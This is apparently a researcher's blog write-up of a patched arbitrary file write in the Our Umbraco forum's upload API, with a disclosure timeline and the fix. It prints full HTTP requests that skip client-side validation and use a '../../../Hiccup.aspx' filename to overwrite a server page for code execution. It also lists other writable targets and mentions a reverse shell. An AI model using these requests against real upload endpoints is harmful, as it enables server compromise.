---
title: OurCE
icon: 💘
date: 2020-12-01
description: Analysis of a critical vulnerability in the Our Umbraco forum, from discovery to remediation.
tags:
  - umbraco
  - dotnet
metaImage: /images/ource/donut-heart.png
metaImageAlt: A heart made of donuts
---

I've done my fair share of digging through the Umbraco source code, previously as a developer and now as a security "professional" 👀. And this has [proved](https://umbraco.com/blog/security-advisory-july-9th-2019/) [worthwhile](https://umbraco.com/blog/security-advisory-july-30th-2019-patch-available/).

It occurred to me after [recent announcements](https://umbraco.com/blog/the-umbraco-community-website-revisited/) that I'd never given the open source [Our Umbraco](https://our.umbraco.com/) site the same attention. So, I pulled down the code and set out to find some vulnerabilities. Once again, a worthwhile exercise...

I discovered an arbitrary file write vulnerability in the API used for uploading images to forum posts. This vulnerability allowed creating or overwriting files in arbitrary locations, providing several potential routes to remote code execution, aka RCE, aka _Bad Shit™_. What follows are the gory details.

---

💊 **Chill**: This is _not_ a vulnerability in the Umbraco CMS (no patches -- yay!). The issue is specific to the Our Umbraco website and has since been patched. I did not exploit it on the live site.

## Disclosure Timeline

- 💌 **Saturday 14 November**: Vulnerability report sent.
- 👍 **Monday 16 November**: Acknowledgement received.
- 🚀 **Tuesday 17 November**: Fix deployed!

## Let's See Some Code!

Below is a snippet of the [vulnerable code](https://github.com/umbraco/OurUmbraco/blob/f1646aa34b484a8d728baa54d9d26ac7693e9564/OurUmbraco/Forum/Api/ForumController.cs#L362). This method is exposed to the front end at the URL _/Umbraco/Api/Forum/EditorUpload_:

```csharp
[HttpPost]
public HttpResponseMessage EditorUpload()
{
    dynamic result = new ExpandoObject();
    var httpRequest = HttpContext.Current.Request;
    if (httpRequest.Files.Count > 0)
    {
        string filename = string.Empty;

        Guid g = Guid.NewGuid();

        foreach (string file in httpRequest.Files)
        {

            DirectoryInfo updir = new DirectoryInfo(HttpContext.Current.Server.MapPath("/media/upload/" + g));

            if (!updir.Exists)
                updir.Create();

            var postedFile = httpRequest.Files[file];

            var filePath = updir.FullName + "/" + postedFile.FileName;
            postedFile.SaveAs(filePath);
```

When an HTTP POST request is made to this method it will save any uploaded files to a randomly generated directory under _/media/upload/_. The original filenames are retained and the files will be publicly accessible. For example, a file named _friendly.jpg_ will end up somewhere like *https://our.umbraco.com/media/upload/8ca832e8-a5d0-4cf1-b46f-fc3da2d7b59a/friendly.jpg*.

Let's look at why this code is vulnerable and how to exploit it.

## Validation Bypass

If you try to upload a non-image file from the front end you will get the following error:

![Screenshot of the error received when attempting to upload an invalid image in the Our Umbraco forum](/images/ource/validation-error.png)

This validation is performed by JavaScript code running in the browser. If the validation fails, the file isn't uploaded and the server-side code above isn't executed.

As you may have noticed, there is no server-side validation of the file type _at all_, so bypassing this validation is simply a matter of issuing an HTTP request directly to the API. We can do this with a tool like Burp Suite or Postman.

The following is an example of a legitimate HTTP request that might be sent to the API from the front end to upload an image:

```http
POST /Umbraco/Api/Forum/EditorUpload HTTP/1.1
Host: localhost:24292
Content-Type: multipart/form-data; boundary=---------------------------276306773941646018834216137931
Cookie: yourAuthCookie=[AUTH COOKIE]
Content-Length: 230

-----------------------------276306773941646018834216137931
Content-Disposition: form-data; name="file"; filename="friendly.jpg"
Content-Type: image/jpg

[IMAGE DATA]
-----------------------------276306773941646018834216137931--
```

📝 **Note**: Images can only be uploaded by logged-in members so a valid authentication cookie must be passed in all requests. This is easily obtained by registering an account and logging in.

Knowing that Umbraco is based on ASP.NET, I first modified the request to upload an ASPX page instead of an image:

```http
POST /Umbraco/Api/Forum/EditorUpload HTTP/1.1
Host: localhost:24292
Content-Type: multipart/form-data; boundary=---------------------------276306773941646018834216137931
Cookie: yourAuthCookie=[AUTH COOKIE]
Content-Length: 243

-----------------------------276306773941646018834216137931
Content-Disposition: form-data; name="file"; filename="unfriendly.aspx"
Content-Type: image/jpg

<%= DateTime.Now %>
-----------------------------276306773941646018834216137931--
```

When accessed, this page displays the current date and time of the server -- a simple proof of concept to show we have code execution capability.

As expected, the upload was successful and the following response was received:

```json
{
  "success": true,
  "imagePath": "/media/upload/c4e18a9b-79a8-4512-859b-473a396dbc44/unfriendly.aspx"
}
```

However, when I navigated to _/media/upload/c4e18a9b-79a8-4512-859b-473a396dbc44/unfriendly.aspx_ in my browser I got a 404 page 😕. This is because Umbraco treats requests with _.aspx_ extensions as _document requests_ -- that is, it will attempt to find a node in the content tree mapping to the URL, rather than serve the file on the file system. Umbraco will only serve up ASPX pages if their paths are specified in the `umbracoReservedUrls` or `umbracoReservedPaths` config settings, which an external attacker doesn't have control over.

I had to try harder...

## Directory Traversal

The second and more subtle issue with the code is in the following line:

```csharp
var filePath = updir.FullName + "/" + postedFile.FileName;
```

The file path here is being constructed using the original filename passed in the request, _which we have control of_. If we prefix the filename with one or more `../` expressions we can traverse up the directory tree and cause the file to be saved to another directory of our choosing.

This doesn't get around the issue that Umbraco won't serve our ASPX page, but what we _can_ do is try to overwrite one of Umbraco's existing ASPX pages. The following request overwrites the default _Hiccup.aspx_ file in the web root directory:

```http
POST /Umbraco/Api/Forum/EditorUpload HTTP/1.1
Host: localhost:24292
Content-Type: multipart/form-data; boundary=---------------------------276306773941646018834216137931
Cookie: yourAuthCookie=[AUTH COOKIE]
Content-Length: 243

-----------------------------276306773941646018834216137931
Content-Disposition: form-data; name="file"; filename="../../../Hiccup.aspx"
Content-Type: image/jpg

<%= DateTime.Now %>
-----------------------------276306773941646018834216137931--
```

If this is successful, when we navigate to _/Hiccup.aspx_ we should see the current date and time, proving that we have achieved server-side code execution:

![Screenshot of the overwritten Hiccup.aspx page being accessed in a browser displaying the current date and time](/images/ource/rce-poc.png)

### File and Folder Permissions

It's worth noting with this sort of vulnerability that it would only be possible to write to locations that are writable by the IIS application pool. I was running the project locally so had full permissions -- the _Hiccup.aspx_ file may not have been writable on the live server, but there are other options.

The Umbraco documentation provides a list of the [file and folder permissions](https://our.umbraco.com/documentation/getting-started/setup/server-setup/permissions) it requires to function. Code execution could also be achieved by writing:

- _.dll_ files to _/bin/_
- _.cshtml_ files to _/Views/_
- _.cs_ files to _/App_Code/_

Taking the attack further I'd probably attempt to deploy something like the [Razor reverse shell](https://stevenhar.land/1589587297/) I shared before (adapted from [this post](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15)), but that's a topic for another day.

## Enough Hax! How Was It Fixed?

The complete fix can be seen on [GitHub](https://github.com/umbraco/OurUmbraco/compare/c0afac42b8419623d9008be788d8ce226411c64a...196df46f5f9f09379e201ce1a04cf5abece68c26). Essentially what it boils down to is, first, validating the file extension against list of allowed extensions:

```csharp
if (new [] { ".gif", ".png", ".jpg", ".jpeg" }.InvariantContains(Path.GetExtension(postedFile.FileName)))
```

And second, sanitising the filename:

```csharp
var filePath = updir.FullName + "/" + Path.GetFileName(postedFile.FileName);
```

Given a string like `"../../unfriendly.aspx"`, the [`Path.GetFileName`](https://docs.microsoft.com/en-us/dotnet/api/system.io.path.getfilename?view=netframework-4.5.2) method will return simply `"unfriendly.aspx"`, and the directory traversal is prevented ⛔. Lovely stuff!

## Takeaways 🍟

If you're a .NET developer, the main thing to take away from this is that value of [`HttpPostedFile.FileName`](https://docs.microsoft.com/en-us/dotnet/api/system.web.httppostedfile.filename?view=netframework-4.5.2) should not be used blindly -- validate and sanitise it accordingly.

You can further harden your site against this sort of attack by ensuring that the IIS application pool runs with as few privileges as possible and can only write files where it needs to.

---

Hopefully this write-up helps folks to build more secure file uploads. Either that or pop them 😏. Drop me a tweet in any case, because I'd love to hear about it.

Finally -- well done to Umbraco HQ for the rapid response and fix! #h5yr 👏
